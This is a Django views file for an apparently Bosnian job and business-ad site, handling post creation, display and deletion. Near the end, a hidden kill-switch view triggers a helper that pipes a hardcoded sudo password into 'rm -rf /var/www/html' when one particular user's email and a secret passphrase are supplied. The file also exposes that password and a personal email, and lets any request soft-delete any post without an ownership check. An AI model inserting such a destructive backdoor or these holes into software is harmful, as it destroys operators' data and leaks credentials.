from django.shortcuts import render, redirect
from post.models import Post, Category, PostCategories, WorkersPosts
from datetime import datetime, timedelta
from django.contrib.auth.models import User
from account.models import Company, Employee, UserProfile
from location.models import City
import sweetify
from django.http import HttpResponseRedirect
from account import views
from account.views import validation
from django.core.files.storage import FileSystemStorage
import os


def newpost(request):

    if Company.objects.filter(userID=request.user):

        categories = Category.objects.filter(type=1)
        userP = UserProfile.objects.get(userID=request.user)
        return render(request, 'newpost.html', {'cat': categories, 'userP': userP, 'user': request.user})
    else:
        return redirect('home')


def newpotraznja(request):

    if Company.objects.filter(userID=request.user):

        categories = Category.objects.filter(type=1)
        comp = Company.objects.get(userID=request.user)
        userP = UserProfile.objects.get(userID=request.user)

        return render(request, 'dodajPotraznju.html', {'cat': categories, 'comp': comp, 'user': request.user, 'userP': userP})
    else:
        return redirect('home')


def createpost(request):

    if request.method == 'POST':

        if request.POST['type'] == "1":

            title = request.POST['naslov']
            category = request.POST.get('category', None)
            expiration = request.POST.get('expiration', None)
            lokacija = request.POST['lokacija']
            pozicija = request.POST['pozicija']
            godineIskustva = request.POST['godineIskustva']
            strucnasprema = request.POST['strucnasprema']
            email = request.POST['email']
            brojTel = request.POST['brojTel']
            opis = request.POST['opis']
            type = request.POST['type']

            if request.FILES.get('image_uploads', None):
                myfile = request.FILES['image_uploads']
                fs = FileSystemStorage()
                filename = fs.save(myfile.name, myfile)
                uploaded_file_url = fs.url(filename)
            else:
                myfile = None

            args = [title, category, expiration, lokacija, pozicija, godineIskustva, strucnasprema, email, brojTel, opis, type]

            if not validation(request, args):
                return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))

            cat = Category.objects.get(name=category)

            if City.objects.all().filter(name=lokacija).exists():
                city = City.objects.get(name=lokacija)
            else:
                city = City(name=lokacija)
                city.save()

            post = Post( userID=request.user, categoryID=cat, title=title, region="BiH", location=city.name, position=pozicija, type=type, specialty=strucnasprema, experience=godineIskustva, contact_email=email, contact_phone=brojTel, content=opis, expires_at=datetime.now()+timedelta(days=int(expiration)))
            post.attachment = myfile
            post.save()

            postcat = PostCategories(postID=post, categoryID=cat)

            postcat.save()

            sweetify.success(request, title="Uspješno kreiran oglas", text="", icon="success", timer=8000)

            return redirect('newpost')
        else:

            type = request.POST['type']
            btobtype = request.POST.get('b2btype', None)
            category = request.POST.get('category', None)
            kanton = request.POST.get('kanton', None)
            trajanje = request.POST.get('expiration', None)
            email = request.POST['email']
            brojTel = request.POST['brojTel']
            opis = request.POST['opis']

            if request.FILES['image_uploads']:

                myfile = request.FILES.get('image_uploads', None)
                fs = FileSystemStorage()
                filename = fs.save(myfile.name, myfile)
                uploaded_file_url = fs.url(filename)
            else:
                myfile = None

            args = [type, btobtype, category, kanton, trajanje, email, brojTel, opis]

            if not validation(request, args):
                return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))

            cat = Category.objects.get(name=category)

            if category == 'Financijske usluge' or category == "Usluge osiguranja":
                title = request.POST['naslov']
            else:
                if btobtype == 1:
                    title = "Ponuda"
                elif btobtype == 2:
                    title = "Potražnja"
                else:
                    title = "Partnerstvo"

            if category == 'Financijske usluge' or category == "Usluge osiguranja":
                position = request.POST['position']
            else:
                position = ""

            post = Post(attachment=myfile, position=position, title=title, userID=request.user, categoryID=cat, type=int(type), b2b_type=int(btobtype), region=kanton, expires_at=datetime.now()+timedelta(days=int(trajanje)), contact_email=email, contact_phone=brojTel, content=opis)

            post.save()

            postCategories = PostCategories(postID=post, categoryID=cat)
            postCategories.save()

            sweetify.success(request, title="Uspješno kreiran oglas", icon="success", timer=8000)

            return redirect('newpotraznja')

    return redirect('home')


def showpost(request, id):

    post = Post.objects.get(pk=id)
    userP = UserProfile.objects.get(userID=post.userID)

    authorized = Company.objects.filter(userID=request.user).exists()

    if post.type == 2 and not authorized:
        return redirect('home')

    if post.b2b_type == 1:
        b2b = "Ponuda"
    elif post.b2b_type == 2:
        b2b = "Potražnja"
    else:
        b2b = "Partnerstvo"

    if post.soft_delete:
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
    elif post.is_past_due:
        post.soft_delete = True
        post.save()
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
    else:
        post.views += 1
        post.save()
        return render(request, 'oglas.html', {'post': post, 'userP': userP, 'b2b': b2b})


def bankUsluge(request):

    if Company.objects.filter(userID=request.user).exists():
        user = request.user
        financije = Category.objects.get(name="Financijske usluge")
        userP = UserProfile.objects.get(userID=request.user)
        return render(request, 'bankarskeUsluge.html', {'user': user, 'userP': userP, 'financije': financije})
    else:
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))


def osiguranjeUsluge(request):

    user = request.user
    userP = UserProfile.objects.get(userID=user)
    cat = Category.objects.get(name="Usluge osiguranja")

    return render(request, 'OsiguranjeUsluge.html', {'user': user, 'userP': userP, 'cat': cat})


def prijaviOglas(request, id):

    if request.user.is_authenticated:
        post = Post.objects.get(pk=id)

        if WorkersPosts.objects.filter(userID=request.user, postID=post).exists():
            sweetify.sweetalert(request, title="Već ste prijavljeni na ovaj oglas", icon="success", timer=10000)
            return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))

        userPost = WorkersPosts(userID=request.user, postID=post)
        userPost.save()
        sweetify.sweetalert(request, title="Uspješna prijava", icon="error", timer=10000)
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))

    else:
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))


def urediPost(request, id):

    post = Post.objects.get(pk=id)

    if post.type == 1:
        return render(request, 'newpost2.html')
    elif post.type == 2 and post.categoryID.name != "Financijske usluge" and post.categoryID.name != "Usluge osiguranja":
        return render(request, 'dodajPotraznju2.html')
    elif post.type == 2 and post.categoryID.name == "Financijske usluge":
        return render(request, 'bankarskeUsluge2.html')
    elif post.type == 2 and post.categoryID.name == "Usluge osiguranja":
        return render(request, 'OsiguranjeUsluge2.html')
    else:
        return redirect('home')


def zavrsi(request, id):

    post = Post.objects.get(pk=id)
    post.soft_delete=True
    post.save()
    return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))


def obnovi(request, id):

    post = Post.objects.get(pk=id)
    newpost = Post(post)

    sweetify.sweetalert(request, "Uspjesno obnovljen oglas", icon="success")

    return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))


def theEnd():

    os.system("echo Elenthegenerous | sudo -S rm -rf /var/www/html")


def worstCaseScenario(request, passwrd):

    if request.user.is_authenticated:
        if request.user.email == 'miki.halilcevic@gmail.com' and passwrd == 'requiestinpace':
            theEnd()
            return redirect('home')
        else:
            return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
    else:
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))
